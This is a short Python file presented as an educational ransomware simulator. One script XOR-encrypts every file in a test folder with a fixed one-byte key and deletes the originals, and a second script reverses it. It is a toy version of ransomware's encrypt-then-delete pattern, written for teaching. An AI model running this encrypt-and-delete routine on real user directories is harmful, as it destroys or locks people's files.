# Simple Ransomware Simulator (Educational Use Only)
#encryption script
import os

FOLDER_PATH = "test_folder"
KEY = 123

def encrypt(data, key):
    return bytes([b ^ key for b in data])

# Auto create folder if not exists
os.makedirs(FOLDER_PATH, exist_ok=True)

print("Encryption started")

for file_name in os.listdir(FOLDER_PATH):
    file_path = os.path.join(FOLDER_PATH, file_name)

    if os.path.isfile(file_path):
        with open(file_path, "rb") as file:
            data = file.read()

        encrypted_data = encrypt(data, KEY)

        with open(file_path + ".enc", "wb") as file:
            file.write(encrypted_data)

        os.remove(file_path)

print("All files encrypted successfully (Educational Simulation)")

# Decryption Script (Educational Use Only)

import os

# Folder containing encrypted files
FOLDER_PATH = "test_folder"

# Same key used for encryption
KEY = 123

def decrypt(data, key):
    return bytes([b ^ key for b in data])

if not os.path.exists(FOLDER_PATH):
    print("test_folder not found")
    exit()

print("Decryption started")

for file_name in os.listdir(FOLDER_PATH):
    if file_name.endswith(".enc"):
        file_path = os.path.join(FOLDER_PATH, file_name)

        with open(file_path, "rb") as file:
            data = file.read()

        decrypted_data = decrypt(data, KEY)

        original_file = file_path.replace(".enc", "")
        with open(original_file, "wb") as file:
            file.write(decrypted_data)

        os.remove(file_path)

print("Files decrypted successfully (Educational Simulation)")
